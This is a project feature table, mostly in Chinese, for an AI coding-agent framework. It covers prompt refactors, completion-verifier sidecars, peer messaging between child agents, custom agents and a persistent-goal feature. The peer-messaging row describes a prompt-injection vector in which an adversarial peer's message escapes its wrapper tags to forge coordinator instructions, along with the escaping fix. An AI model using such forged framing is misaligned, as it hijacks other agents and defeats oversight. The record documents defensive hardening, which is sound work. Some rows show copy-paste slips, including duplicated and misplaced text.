| `124` | Memory System Alignment — 4-Type Taxonomy (user/feedback/project/reference) + Two-Step Save Helper | Enhancement / Persistence | Medium | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_124-memory-system-alignment) |
| `189` | Systemic Prompt Audit + Anti-Pattern Hygiene Sweep + Tool Description Layering — ADR-033 Phase 2 Across All LLM-Facing Prompts | LLM Prompt / Quality / Systemic Refactor | High | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_189-systemic-prompt-audit--anti-pattern-hygiene-sweep) | **ADR-033 Phase 2 v0.7.43 落地 — v0.7.43 整体 prompt 体系提升 feature，覆盖全部 LLM-facing prompt（不只 todo / fan-out / dispatch 任意单类）**。Evidence: FEATURE_177 RULE D C5 kimi -60pp + FEATURE_120 send_message/task_stop +30pp/-60pp + claudecode-style panel C4 baseline 0/25 vs no-✗ 4-5/25 + 2026-05-22 双 agent inventory（claudecode 47 prompt 文件 + KodaX 全 prompt 量化对比）。**双重点**：(1) ✗ 反模式审查（ADR-033 §3 — 已识别最高 cross-case regression 风险）；(2) **工具描述分层（ADR-033 §6 — claudecode-shape 双层结构：registry desc 3-8 字 identity + 详细教学按需注入，vs KodaX 现状 700-1600 字单 string）**。Phase A audit catalog 按 ADR-033 §1-6 标 risk class；Phase B 拆 6 sub-block staged ship（B.1 todo_update 分层 / B.2 todo_create 分层 / B.3 PLAN-FIRST trigger qualitative / B.4 RULE A/B/C label 去除 / B.5 version header 清理 / B.6 ✗ 加 WHY），每 sub-block 独立 panel + 3-judge LLM audit + DATA VALID gate + pre-registered SHIP gate；Phase C staged commit + 永久 regression sweep。Scope: worker / generator / scout / planner role prompts + capability-sections.ts 13 段 + system.ts SYSTEM_PROMPT + protocol-emitters + classifier-prompt + child-briefing + 所有 30 个 tool description（registry.ts）。**量化收敛指标 v0.7.43 release 时**：§4 enumerated taxonomies 在 main role-prompt + 高频 tool 内 = 0（当前 20+）；§5 FEATURE_xxx / vX.Y.Z = 0（当前 ~25）；§6 高频 tool registry desc ≤ 200 字（当前 todo_update 1600 / todo_create 700）。**不在 scope**：FEATURE_177 REVERT + FEATURE_188 dispatchRules + FAN-OUT 3-bullet (1e60eeb0)（v0.7.42 已 ship）/ CLAUDE.md / AGENTS.md（user-maintained）。预算 ~$16-26 / 3-5 天 |
| `190` | FEATURE_184 Cleanup Tail — Text-Only Termination + emit_handoff Tool Surface Removal + Evaluator Prompt Sweep | Internal / Architecture + Prompt Refactor | High | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_190-feature_184-cleanup-tail) | **基于 2026-05-23 用户实战 session 中发现的 F184 Phase C/D 尾巴未清干净问题立项**。F184 v0.7.45 已删 Evaluator 角色 + Worker/Generator handoffs=[]，但 prompt 层 + tool surface 层 + recorder slot 层未同步清理：(1) [`worker-role-prompt.ts:217-222`](../packages/coding/src/agents/worker-role-prompt.ts#L217-L222) `handoffRules` 还在教 "EVALUATOR HANDOFF (KodaX structural gate, preserved as an independent role)" + "You CANNOT bypass the Evaluator"；(2) `agent-chain.ts:886` Worker.tools 第一项 + `coding-agents.ts:118` Generator.tools 还在 attach `handoffEmit`；(3) `protocol-emitters.ts:281` `emitHandoff` tool 仍 export，description 还写 "Emit the Generator handoff to the Evaluator"；(4) `recorder.handoff` slot 通过 4 个 load-bearing 路径绑死 V2 terminal signal（`detectIdleYield` / `continuationSuggested` 公共 API / `status-derivation` blocked 路径 / `parse-helpers.expectedEmitToolName`），现状必须经 emit_handoff 才能终止；(5) stall-sidecar prompt L54+L84 + `ALLOWED_SUGGESTED_TOOLS` 仍把 `emit_handoff` 列为可建议工具（误导 stall detector）；(6) `idle-yield.ts:221` `detectMissingTerminalVerdict` F184 Phase C.2 删调用点后剩死代码。**LLM 后果**：模型按 prompt 教导调 `emit_handoff` → runner 无下游 agent 可派（handoffs=[]）→ tool 当 termination signal 用 → sidecar verifier 触发。冗余 tool call + 误导的 "等审计" 心智模型 vs F184 设计的 "text-only 终止 + sidecar 静默 verify" 严重不对齐。**5 phase**：(0) NIL-conflict plumbing（stall-sidecar suggest list + tool-permission case + `detectMissingTerminalVerdict` 死代码删，byte-identity snapshot regenerate，zero eval）；(1) Terminal signal 架构切换（runner 检测 final assistant msg text-only + 无 tool_use 触发 recorder.terminalText / FEATURE_165 pending-children gate 迁移 / `payload-builder.continuationSuggested` 重写）；(2) Worker/Generator prompt rewrite + role-prompt.ts Worker case + `protocol-emitters.ts` description 去 Evaluator，Layer 2 panel 5 alias × 4 case × 2 variant × 5 run = 200 cells + 3-judge LLM majority audit + pre-registered SHIP gate；(3) Tool surface deletion（handoffEmit/emitHandoff/EMIT_HANDOFF_TOOL_NAME + 公共 SDK re-export 处理）；(4) Test rewrites（~98 refs / 9 files，mechanical）；(5) docs + CHANGELOG + ADR-030 update。**Layer 2 eval design (Phase 2 SHIP gate)**: (a) V_new C1+C2+C4 text-only termination rate ≥80% per alias; (b) V_new C3 false-termination rate ≤20% per alias (negative anti-trigger); (c) summary keyword presence ≥80% per case; (d) cross-variant judge "task converged" rate no regression; (e) 3-judge audit disagreement <10% DATA VALID per EVAL_GUIDELINES anti-pattern 7. Pilot 1×1×1 ark/v4flash. **预算**: ~$13-15 eval / 3-5 工作日。**风险**: floor + mid-tier model (zhipu/glm51 + ark/v4flash) 对 "must call emit_handoff" anchor 依赖度高（per [[feedback_adr_033_enumerated_per_block_evidence]]），Phase 2 prompt 修改是 ADR-033 §3 ✗ 反模式删除高风险类，**Layer 2 实测前不可假设安全**。**冲突管控**: 与 F189 Batch 1/3 共享 worker-role-prompt.ts；进 Phase 2 前 `git fetch && git status`，若 F189 同时改用 `git add -p` 选择性 stage（[[feedback_selective_hunk_staging]]） |
| `187` | Stall Sidecar Middleware Unification — F178 加入 `agent-runtime/middleware/`、Factory Hook、Env Provider Override、Opt-In Log | Internal / Architecture + Refactor | Medium | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_187-stall-sidecar-middleware-unification) | **基于 ADR-030 §1584 placeholder cashed-in 立项（2026-05-22）**。F184 verifier sidecar 已落到 `agent-runtime/middleware/sidecar-verifier/` 形成 canonical sidecar shape（factory + env override + opt-in log），但 F178 stall sidecar 仍硬接在 `task-engine/runner-driven.ts:651` 通过 4 个 inline call site，模块还在 `multi-instance/` 语义错位、provider 写死、production 没有 observability hook。**Goal**：把 F178 拉到跟 F184 结构同形 —— co-located middleware + 单工厂 + env-overridable provider + opt-in `/stall-log` slash 命令，coding 层 wiring 从 4 site 减到 1 site；**不**抽 SidecarRegistry framework（ADR-030 §C 已否决 — 4 sidecar 在 trigger/output/latency/context 4 维度全不重合）。**Non-goals**：不动 F178 prompt / L1+L2 设计 / eval（eval `1909d5d2` SHIP-SIDECAR-ALL 不重跑）；不动 `stall-detector.ts` killswitch；不让 F178 走 sideQuery（同 F184 约束 — 需 tool call,sideQuery 强制 tools=[]）。**4 phase**：(A) 模块迁移 + `createStallSidecarToolObserver({provider,model,detector,onVerdict?})` 工厂返回 `{observer:RunnerToolObserver, reset:()=>void}`,3 个 prompt asset byte-identity 锁兜底 zero-eval；(B) `stall-provider-resolver.ts` 镜像 `verifier-provider-resolver.ts` + `KODAX_STALL_PROVIDER` + `KODAX_STALL_MODEL` 2-step 解析；(C) ObserverBridge `stallSidecarFired(info)` 镜像 `sidecarFinished` + env-gated `KODAX_STALL_LOG=1` + 用户 config `stallLog?:boolean` + `/stall-log [on\|off]` slash 命令（精简版,同 `/verifier-log`）；(D) `composeToolObservers(...observers)` helper + 文档化 stall-first hook 顺序 + 删除迁移后 unreachable inline 调用。**Acceptance**（pre-registered）：3 个 prompt asset byte-identity assertion；F178 既有测试 0 改动全 PASS；~13 新测试（resolver 4 + observer-bridge 4 + compose 3 + factory wiring 2）；全量回归绿；**eval $0**（byte-identity 锁兜底）；ADR-030 §1584 从 "optional follow-up v0.7.46+" 改 "shipped v0.7.43"。**成本**：~360 LoC 代码 + ~200 LoC 测试 + 1-2 工作日 |
| `123` | Peer-to-Peer SendMessage — Child Agent Inter-Communication on Top of FEATURE_120 Routing | Internal / Architecture | Medium | `v0.7.44` | [v0.7.44](features/v0.7.44.md#feature_123-peer-to-peer-sendmessage) | **✅ SHIPPED 2026-05-25/28 v0.7.44 5 commits**: `194465f2` (base routing) + `88e43a7c` (per-turn flood throttle) + `dce02763` (eval pilot fallback) + `ffc93166` seen_by multi-hop cycle list + (this commit) prompt-injection escape harden across all 4 wrapper paths (content body + from= + seen_by= attribute values). 4 routing shapes (Worker→child / child→peer / child→worker / broadcast `to:'*'`) + grand-child parent-de-dup + self-send 1-hop cycle guard + broadcast cap=20 + child role-prompt Peer Communication section + Worker prompt update. **Per-turn flood throttle ships in v0.7.44 (`88e43a7c`)** — `KodaXToolExecutionContext.sendMessageTurnCounter: { count: number }` provisioned in `tool-execution-context.ts`; `chargeTurnCounter(ctx, additional)` charges 1 per `sendToWorker` / N per broadcast (where N = `targetCount`) / 1 per single-target peer; caps `WORKER_PER_TURN_CAP=20` for Worker (`currentAgentId===undefined`) and `CHILD_PER_TURN_CAP=5` for any child; over-cap returns `[Tool Error] send_message: per-turn ... limit reached for this Worker|child (limit=N)`; counter resets at every `beforeNextTurn` boundary via runner-driven `wrappedBeforeNextTurn` zero-reset after goal hook runs; backward-safe no-op when field unset. 28 unit tests green (22 base routing + 6 throttle: child cap=5, Worker cap=20, broadcast charges N, mixed peer+broadcast, bypass when counter unset, counter reset observable). Eval scaffolding (4 cases C1 peer-conflict / C2 worker-notify / C3 broadcast / C4 no-spam) + KODAX_F123_MODE driver with `KODAX_F123_PILOT_ALIAS` env override (defaults pilot to `kimi` — ark-coding CodingPlan subscription lapses periodically). **Layer 2 panel** (5 alias × 4 case × 5 run = 100 probe; ark-coding subscription lapsed mid-panel → 3 alias active = 60 probe + 3-judge audit panel-internal = 180 audit calls): C1 peer-conflict 93% (14/15) / C2 worker-notify 100% (15/15) / C3 broadcast-scope-shift 0% (0/15 — eval case design issue: all 3 alias correctly identified their task was already within allowed scope so no broadcast needed) / C4 no-spam-guard 0% (0/15 — eval case design issue: all 3 alias used `send_message(to=worker)` to report task completion, reasonable child→worker notify not spam). Per [[feedback_pre_registered_gate_saturation]] evidence-driven SHIP: C1+C2 prove the four routing shapes work end-to-end; C3/C4 are eval case design artefacts revealed only post-run (userMessage assumed broadcast was always-correct / any-send-was-spam), not production failures. C3/C4 eval case designs to be rewritten as a v0.7.45 follow-up; current driver retained as permanent regression sweep for C1/C2. **seen_by multi-hop cycle list shipped in v0.7.44** — optional `seen_by: string[]` tool parameter; auto-append caller on enqueue; embed `seen_by="A,B,…"` attribute on every peer-direction wrapper (`<peer-message>` / `<child-notification>` / `<peer-broadcast>`; `<coordinator-instruction>` unchanged since Worker→child is fresh dispatch not forward); three guards (single-target cycle reject when `to ∈ seen_by`, worker-target cycle reject when parent in chain, broadcast cycle filter silently skips already-seen siblings + errors when chain exhausted) + structural depth cap `MAX_FORWARD_DEPTH=5` independent of LLM cooperation. 10 new unit tests (fresh wrapper / forward extension / 2-hop A→B→A / 3-hop A→B→C→A / worker-sentinel / depth cap / broadcast filter / chain exhausted / non-string defensive parse / non-array param tolerated). 2-tier dispatch DAG today never produces multi-hop chains; ships as forward-compatible protection ahead of any future repointel-protocol grand-child surface. **Zero v0.7.45 deferred items remain for F123**. **Security harden** post-architect/security review 2026-05-28: all 4 wrapper paths HTML-escape `<>&` in content body + from= / seen_by= attribute values via `escapeTagBody` (mirrors F192 `<objective>` escape pattern; closes multi-hop prompt-injection escalation vector where an adversarial peer's content could break out of `</peer-message>` framing into forged `<coordinator-instruction>`)
| `191` | User-Authored Custom Agents — Markdown Loader + Extension `registerAgent` + `dispatch_child_task` Bridge | Core / Architecture + SDK Surface | High | `v0.7.43` | [v0.7.43](features/v0.7.43.md#feature_191-user-authored-custom-agents) | **基于 2026-05-23 用户提问发现的能力 gap 立项**。KodaX 已具备 LLM-driven agent generation 全栈（FEATURE_087/088/089/101 已 ship v0.7.28-31，code 在 `packages/coding/src/construction/`），但 (a) Worker 无法通过 `dispatch_child_task` 派遣已注册 specialist；(b) 用户无法手写 markdown 文件直接定义 agent；(c) extension API 缺 `registerAgent`。三条 gap 同源（dispatch + 数据入口），一次性闭环。**Supersedes v0.7.50 FEATURE_128 placeholder**（原 dispatch-only scope 被本 feature 完整闭环）。**3 phase**：(A) `dispatch_child_task` schema 加 `subagent_type?: string` + Worker SP 注入 `listConstructedAgents()` 描述符 block + `child-executor.ts` 路由分支用 specialist agent 的 instructions/tools/reasoning/guardrails 覆盖 stock bundle，unknown name 返 tool error 不 throw + Worker role-prompt dispatchRules 加 1 句 qualitative specialist-routing 指导（per ADR-033 §1+§3+§4+§5）；(B) `packages/coding/src/construction/markdown-loader.ts` 新增扫 `${getAgentConfigHome()}/agents/*.md` + `${cwd}/.kodax/agents/*.md`，gray-matter 解析 frontmatter（name/description/tools/model + body）→ `AgentManifest` → **同一** `Runner.admit` 5-step gate → `registerConstructedAgent`，其它字段（mcpServers/hooks/memory/isolation/permissionMode/maxTurns/skills）v0.7.43 忽略 + 不报错前向兼容，source tag 优先级 built-in < extension < markdown:user < markdown:project < constructed:cli < constructed:llm；(C) `KodaXExtensionAPI.registerAgent: (manifest: AgentManifest) => () => void` + `extensions/runtime.ts` 实现走同一 admission + dispose-on-deactivate。**Acceptance**（pre-registered）：A.1-A.4 unit + B.1-B.4 markdown-loader unit + C.1-C.3 extension unit + Layer 2 panel 5 alias × 4 case × 5 run = 100 cells + 3-judge LLM majority audit + DATA VALID gate + pre-registered SHIP gate (a) C1 specialist matches dispatch rate ≥60% per alias / (b) C3 false-name dispatch rate ≤10% per alias / (c) C4 multi-specialist fan-out ≥50% per alias / (d) judge disagreement <10% / (e) 4-of-5 alias 满足 (a)+(b)+(c)（kimi floor per `feedback_model_structural_floor_not_prompt_tunable` 单 alias DEFER 不阻 SHIP）。**Pilot 1×1×1 ark/v4flash 先验**。**预算**: ~$5-7 eval / 3-5 工作日 / ~340 LoC 实现 + ~25 测试。**Non-goals**: 不实现 `/agents` slash UI (defer v0.7.46+); 不消费 frontmatter mcpServers/hooks/memory/isolation/permissionMode/maxTurns/skills（前向兼容忽略）; 不改 FEATURE_101 admission contract 7 invariant 内部; 不实现 dispatch-time re-admit（boot-time 已 gate，性能 vs 安全边际收益不平衡）; 不引入 hot reload（用户改 markdown 需重启 session）; 不删 CLI `kodax constructed admit` / Worker `scaffold_agent` 工具（三入口共存）。**冲突管控**：A.4 worker-role-prompt.ts 与 F189 Batch 3 + F190 Phase 2a 并发，进 A.4 前 `git fetch && git status`，若并发用 `git add -p` 选择性 stage（per `feedback_selective_hunk_staging`）|
| `192` | User-Set Persistent Goal — `/goal` Slash Command + 3 Goal Tools + Sidecar-Verified Completion + 3-Turn Blocked Rule + DEFERRED_TOOL_HINTS Wiring | Core / Feature + Prompt Design | High | `v0.7.44` | [v0.7.44](features/v0.7.44.md#feature_192-user-set-persistent-goal) | **✅ SHIPPED 2026-05-25/28 Phase A-F end-to-end + continuation prompt Codex-faithful rewrite** — commits `3add3fe0` (Phase A schema + session-lineage) + `43a9b4a5` (Phase B accounting + lifecycle composer) + `06ed8bef` (Phase C tools + sidecar bind + DEFERRED_TOOL_HINTS) + `5bc75f09` (Phase D `/goal` slash command + lineage persistence) + `ab504c1c` (Phase E eval scaffolding) + `88e43a7c` (Phase F runtime wire + Phase B per-turn delta persistence bug fix) + `dce02763` (eval pilot fallback) + `510ab185` continuation prompt Codex-faithful rewrite. 108 unit tests green (Phase A 18 / Phase B 57 / Phase D 22 / Phase F runtime-wiring 11). **Phase F runtime wire shipped in v0.7.44** — new `packages/coding/src/goal/runtime-wiring.ts` factory (~210 LoC) distils codex `ext/goal/extension.rs` shape into single `buildGoalRuntimeBinding(deps) → {goalContext, lifecycleCtx, defaultContinuationPrompt}`; **continuation prompt is now Codex-faithful** mirroring all 7 sections of `codex-rs/core/templates/goals/continuation.md` verbatim (Continuation behavior / Budget / Work from evidence / Progress visibility / Fidelity / Completion audit / Blocked audit) with KodaX-specific substitutions (`update_plan` → `todo_*`, HTML-escape objective body, null tokenBudget graceful render) plus two appended "Runtime enforcement" paragraphs (Sidecar Verifier hard gate on Completion audit + 3-turn `blocker_kind` counter on Blocked audit). Earlier Phase F draft trimmed the prompt aggressively under ADR-033 §4 "no enumerated taxonomies" — **misapplication** because Codex's enumerated list names AUDIT DIMENSIONS (requirements / artifacts / commands / tests / gates / invariants / deliverables), not the classification taxonomies §4 was written against. Correlated with Layer 2 C1=53% understated rate. Rewrite restores all dropped sections; ADR-033 §4 scope clarification recorded at [[feedback_adr_033_scope_clarification_new_feature]]. **A/B panel rerun 2026-05-28** (3-active-alias × 4 case × 5 run = 60 cells): aggregate flat 73% (44/60); per-case C1 +14pp (53→67%) + C4 +13pp (67→80%) REAL lifts, C3 -26pp (73→47%) **judge artifact** (model now calls `get_goal` to verify state before `update_goal({blocked})` — production-correct verification step, regex misses it; model intent in 10/10 zhipu+kimi C3 cells identical), C2 saturated. Judge-corrected aggregate estimate ~85-90%. SHIP keep — see [[project_feature_192_codex_faithful_panel_ab]]. `createGoal` emits codex-parity `complete → cleared → created` transition when prior goal was complete; `createGoal` emits codex-parity `complete → cleared → created` transition when prior goal was complete; `requestBlocked` persists in-progress counter (`event='updated'`) on 3-turn-rule reject so counter survives across turns. `runner-driven.ts` wire is minimal (~30 net LoC) per file-size discipline — `goalLifecycleCtx` composed from binding + per-call `tokenStateRef.current.lastUsage` + `turnStartMsRef`; `wrappedBeforeNextTurn` wraps extracted `baseBeforeNextTurn` via `withGoalBeforeNextTurn`; `stopHook` wraps `composedStopHook` via `withGoalStopHook`. REPL wire (`packages/repl/src/interactive/repl.ts`) constructs binding before `runManagedTask` when `isGoalFeatureEnabled()`; `verifyComplete` ships as `() => ({ok: true})` stub in v0.7.44 — F184 Sidecar Verifier already fires on Worker text-only termination that typically follows `update_goal({complete})`, so strong-bind is partially in place via existing verifier path; dedicated tool-level wrap deferred until second use-case motivates transcript-bridge plumbing. **Phase B lifecycle.ts persistence bug fix included** in `88e43a7c` — pre-fix only persisted on `budget_limited` flip → `/goal status` showed 0/0 until budget tripped; post-fix persists `'updated'` event whenever `nextState !== goal`. ADR-033-compliant tool descriptions + 3-turn runtime counter (physical-state anchor exception §1) + F184 Sidecar Verifier strong-bind on `update_goal complete` all live. **Layer 2 panel** (5 alias × 4 case × 5 run = 100 probe; ark-coding subscription lapsed mid-panel → 3 alias active = 60 probe + 3-judge audit zhipu/glm51 + ark/v4pro + kimi panel-internal per Judge constraint = 180 audit calls; 4.4% audit disagreement DATA VALID): C1 simple-continuation 53% (8/15) / C2 weak-evidence-complete 100% (15/15) / C3 repeated-blocker 73% (11/15) / C4 budget-approaching 67% (10/15). Aggregate 44/60 = 73%. SHIP gates (a) ≥1/3 trigger every case + (b) audit ≤10% disagreement + (c) per-alias ≥4/5 ≥60% all MET by 3-of-3 active aliases per [[feedback_pre_registered_gate_saturation]] (ark absence is provider-side subscription lapse not eval failure; full 5-alias rerun deferred to next prompt-iteration window when ark subscription restored)
| `198` | Provider Capability Metadata — JSON-Backed Single Source of Truth for `KODAX_PROVIDER_SNAPSHOTS` (Data-Logic Separation + Loader + Zod Schema) | Internal / Architecture + SDK Surface | Medium | `v0.7.44` | [v0.7.44](features/v0.7.44.md#feature_198-provider-capability-metadata) | **2026-05-25 立项**——v0.7.43 commits `7f627d0c` + `c37b0a13` 把 12 个 built-in provider 静态参数（`contextWindow` / `maxOutputTokens` / `thinkingBudgetCap` / `supportsThinking` / 完整 `models: KodaXModelDescriptor[]`）从各 Provider class config 提升到 `KODAX_PROVIDER_SNAPSHOTS` 单一常量 + 9 个 SDK getter（built-in/custom/unified 三层），把"数据 vs 逻辑"边界往前推一步。但 `KODAX_PROVIDER_SNAPSHOTS` 仍是 **TS const 编译进 bundle**——provider 改 contextWindow（e.g. Kimi K2.6 256K→384K）的更新路径仍然 `edit registry.ts → bump version → npm publish → consumer npm update`，至少几天 propagation delay，结构性 gap。**探针确认上游 `/models` API 不是退路**: 2026-05-25 `scripts/probe-upstream-model-metadata.mjs` 跑 5 个 provider（zhipu-coding / kimi-code / minimax-coding / ark-coding / deepseek）—— zhipu/mmx/ds 只返 `{id, object, owned_by, created}` 无 context-window；kimi-code HTTP 401；ark-coding `/v3/models` 含 `token_limits` 但 **Coding-Plan 模型 0 命中**。"KodaX 自己 maintain 的 snapshot 是唯一可靠源"。**用户对设计方向的明确表态**: "[JSON 数据文件分离] 看起来是比较像我想的；我说的热更新不是说用户自己 override，这个用户本身现在就可以自定义 provider 完成"——明确选**方案 A（JSON 分离）**，不要 B（用户已能通过 `customProviders` config 自定义 built-in override）。**Phase A 范围（本 FEATURE 单 phase ship）**：拆 `KODAX_PROVIDER_SNAPSHOTS` 纯数据到独立 JSON + runtime loader + zod schema 校验，**只做数据-逻辑分离**，不引入网络拉取 / fs.watch / 远程 manifest。Hot-update 真正实现 path 留作后续独立 FEATURE 立项 v0.7.46+。**文件结构**: `provider-capabilities.json` (NEW, ~12 entries) + `provider-capabilities.types.ts` (NEW, zod schema + 类型守卫) + `provider-capabilities.loader.ts` (NEW, load + validate + merge + cache + freeze + 测试 reset hook) + `provider-capabilities.test.ts` (NEW) + `registry.ts` (MOD, `KODAX_PROVIDER_SNAPSHOTS` 通过 loader 计算获得，Provider class + factory + getter 不变)。**Bundle 集成**: esbuild external + 直接 cp 到 dist 供 runtime 读；Bun CLI binary 用 `--asset` embed。**Hot-update paths unlocked (Phase A 仅 dist patch active)**: (1) dist patch — consumer 改 `node_modules/@kodax-ai/kodax/dist/.../provider-capabilities.json` 立刻生效（不需要 rebuild）；(2) env var override — `KODAX_PROVIDER_CAPABILITIES_PATH` 指向用户文件（v0.7.46+ 独立立项）；(3) 远程 manifest — fetch + ETag + fallback（v0.7.46+ 独立立项）；(4) fs.watch + reload — dev mode（v0.7.46+ 独立立项）。**7-step 实施**: (1) 写 zod schema + types + JSON file（手动同步现 registry.ts 数据）；(2) 写 loader + freeze + cache；(3) 改 registry.ts `KODAX_PROVIDER_SNAPSHOTS` 调 loader；(4) 写 ~20 unit test + 1 drift guard (JSON 与 registry.ts 历史 snapshot 数据 byte-identical)；(5) esbuild config 加 external + cp 规则；(6) CLI binary `--asset` embedding 配置；(7) doc 更新（SDK_EMBEDDER_GUIDE §9 加 hot-update 章节 + ADR-024 addendum）。**Acceptance**（pre-registered）: (a) `KODAX_PROVIDER_SNAPSHOTS` JSON-loader 计算值 = v0.7.43 hardcoded 值 byte-identical（drift guard test）；(b) 全套 12 个 built-in provider getter API 行为不变（9 个 SDK getter 测试 0 改动）；(c) zod schema 拒绝 invalid JSON（unknown provider name / missing required field / wrong type）；(d) loader freeze 行为正确（caller 不能 mutate 返回值）；(e) `npm run build:packages` 正确产出 dist + JSON file；(f) `node -e "require('@kodax-ai/kodax/llm').listBuiltinModelCapabilities()"` 在 npm linked / installed 环境工作；(g) 0 prompt eval（纯数据-逻辑分离，无 LLM-facing behavior change）。**Non-goals**: ❌ env var path override（Phase A 不做）❌ 远程 manifest fetch ❌ fs.watch hot-reload ❌ setter API（registerProviderCapability 等，YAGNI 直到 3+ consumer 案例）❌ breaking change（既有 9 个 SDK getter API 保持）。**风险 + 缓解**：(R1) JSON-TS data 漂移 — drift guard test 强制 byte-identical；(R2) bundle 路径 platform-specific — esbuild + Bun --asset 双 path 测试；(R3) zod schema 增加 build-time 依赖 — zod 已是 llm package 直接 dep（KodaXCustomProviderConfig 校验用），0 新增 dep；(R4) freeze 误用 — TypeScript `as const` + `Object.freeze` 双保险 + 测试覆盖。**预算**: $0 eval / 1-1.5 工作日 / ~200 LoC 实现 + ~100 LoC 测试 / single-commit atomic ship。**参考**: ADR-024（v0.7.43 SDK subpath addendum）/ scripts/probe-upstream-model-metadata.mjs / scripts/probe-ark-tokens.mjs / [[feedback_workspace_packages_need_rebuild]] / [[feedback_no_guessing_api_names]]. **Shipped 2026-05-25 commit `dd459e56`** — 1-phase atomic ship: `provider-capabilities.json` (13 entries) + hand-rolled `validateProviderCapabilitiesJson` (no zod — KodaX 极致轻量化, no new deps) + `provider-capabilities.loader.ts` 4-mode resolution (dev/npm, SDK bundle root, bundle chunk parent-dir fallback, Bun --compile binary sidecar via KODAX_BUNDLED + process.execPath) + `deepFreezeSnapshot` + `_resetProviderSnapshotsCache` test hook. `packages/llm/package.json` build script + `scripts/build-bundle.mjs` + `scripts/build-binary.mjs` copy JSON next to artifact (dist-patch hot-update path active). 30 unit tests green; `KODAX_PROVIDER_SNAPSHOTS` byte-identical to v0.7.43; full LLM suite 304/304 ✓. Closes v0.7.43 SDK-MODEL-CAPS architectural debt — capability metadata patchable in `dist/` without `npm publish + consumer npm update` | **2026-05-23 立项对标 OpenAI Codex `/goal` 能力**（`codex-rs/ext/goal/` 独立 Rust crate，~3-5K LoC + SQLite `thread_goals` 表 + 3 tools + 3 prompt templates + 6 contributor types）。pi-goal (Michaelliv/pi-goal) 是社区轻量版参考（467 行单文件）但能力不足。KodaX 历史 `/project` (FEATURE_024) 已于 FEATURE_086 v0.7.27 退役，职责被 AMA Scout-first 吸收，但**用户级 long-running objective + 持续 continuation + 完成审计**这条用户路径没替代——本 FEATURE 补齐。**3 决策点定型**：(1) `create_goal` tool 留口子让模型主动建（用 description qualitative 严格限制 per ADR-033 §1 "Create a goal only when explicitly requested by user or system/developer instructions; do not infer from ordinary tasks")；(2) `update_goal` 接 `complete \| blocked` 双状态——`complete` runtime 触发 FEATURE_184 Stop-hook Sidecar Verifier strong-bind（verifier 不 BLESS 则 tool reject，**比 Codex prompt-only audit 强**），`blocked` validate 3-turn runtime counter (same blocker_kind 连续 3 turns 才允许，对应 Codex continuation.md "at least three consecutive goal turns" 但加 runtime 强校验)；(3) 持久化用 session-lineage **不引入新 DB**——通过扩展 `KodaXSessionEntry` discriminated union 新增 `KodaXSessionGoalEntry { type: 'goal'; goal: KodaXGoalState; event: 'created' \| 'updated' \| 'cleared' \| ... }`（precedent: `KodaXSessionLabelEntry` / `KodaXSessionArchiveMarkerEntry`），CASCADE delete 语义靠 session tree 自然继承。**Layer 决策**: 经现状审计 KodaX `packages/agent` 实际是 primitives 层（types/messaging/admission/memory dir/primitives），所有 runtime middleware + role prompt + tool registry 都在 `packages/coding/src/agent-runtime/` + `packages/coding/src/agents/` + `packages/coding/src/tools/`。Per YAGNI + 3+ use case rule 不强行上抽到 agent；agent 包只加最小 schema (`KodaXGoalState` interface + `KodaXSessionGoalEntry` 加入 union)，主体实现在 `packages/coding/src/goal/`，UI 在 `packages/repl/`。**5 phase**: (A) `packages/agent/src/types.ts` schema + `packages/session-lineage/src/` 读 helper `readLatestGoalFromBranch` (~80 LoC); (B) `packages/coding/src/goal/{state,accounting,blocker-tracker,lifecycle,prompts}.ts` 包含 token formula `(input − cached_input) + max(0, output)` + plan-mode 排除 accounting + 3-turn runtime counter + 接现有 `packages/coding/src/agent-runtime/middleware/` composition (~200 LoC); (C) `packages/coding/src/goal/tools/{get-goal,create-goal,update-goal}.ts` + `sidecar-bind.ts` (update_goal complete → 调用 stall-sidecar verifier) + 3 prompt template TS const (continuation/budget-limit/objective-updated，过 ADR-033 5 原则 audit) + DEFERRED_TOOL_HINTS 注册（goal active 时 surface full description，无 goal 时 hint-only，per FEATURE_189 B.3 progressive disclosure pattern）(~250 LoC); (D) `packages/repl/src/commands/goal-command.ts` (`/goal <obj> [--tokens 50k] \| status \| pause \| resume \| clear`) + InkREPL bottom-pane `GoalStatusChip` + `ResumePausedGoalPrompt` + custom event renderer 折叠 badge (~150 LoC + `KODAX_GOAL_ENABLED` env default OFF 灰度); (E) Layer 2 prompt eval — pilot 1×1×1 ark/v4flash 先验 continuation prompt 触发→ panel 5 alias × 4 case (C1 active continuation / C2 completion audit resist weak evidence / C3 blocked 3-turn / C4 budget_limit wrap-up) × 5 run = 100 cells + 3-judge LLM majority audit。**Pre-registered SHIP gate**：(a) C1 continuation rate ≥80% per alias / (b) C2 false-complete rate ≤15% per alias (sidecar runtime gate 兜底，但 prompt 也需 align) / (c) C3 blocked-trigger correct rate ≥60% per alias / (d) C4 wrap-up signal ≥80% per alias / (e) judge disagreement <10% DATA VALID / (f) 4-of-5 alias 满足 (a)+(b)+(c)+(d)（floor model kimi 单 alias DEFER 不阻 SHIP per `feedback_model_structural_floor_not_prompt_tunable`）。**预算**: ~$13-17 eval (含 pilot) / 4-6 工作日 / ~680 LoC 实现 + ~30 测试。**Non-goals (deferred to Layer 1 v0.7.45+ 独立立项)**: token-budget enforcement 整合到 cost report / plan-mode permission 完全排除 / budget_limited 状态自动 emit / replace 确认 popup / optimistic concurrency `expected_goal_id` check / ephemeral session 拒绝。**Non-goals (deferred to Layer 2 v0.7.46+ 独立立项)**: AMA Scout 集成（goal active 时自动 fan-out dispatch_child_task）/ F185 hits ledger 跟 goal 联动 / F170 todo V2 集成（对标 Codex `update_plan`）/ multi-goal across session branches。**冲突管控**: 不动 worker-role-prompt.ts，与 F189 Batch 3+5 / F190 / F191 全部解耦。session-lineage `readLatestGoalFromBranch` 与 F185 hits ledger 共享 branch 遍历 pattern 但语义独立。需先确认 F184 sidecar verifier 公共调用接口稳定（应已 stable per `project_feature_184_shipped`）|
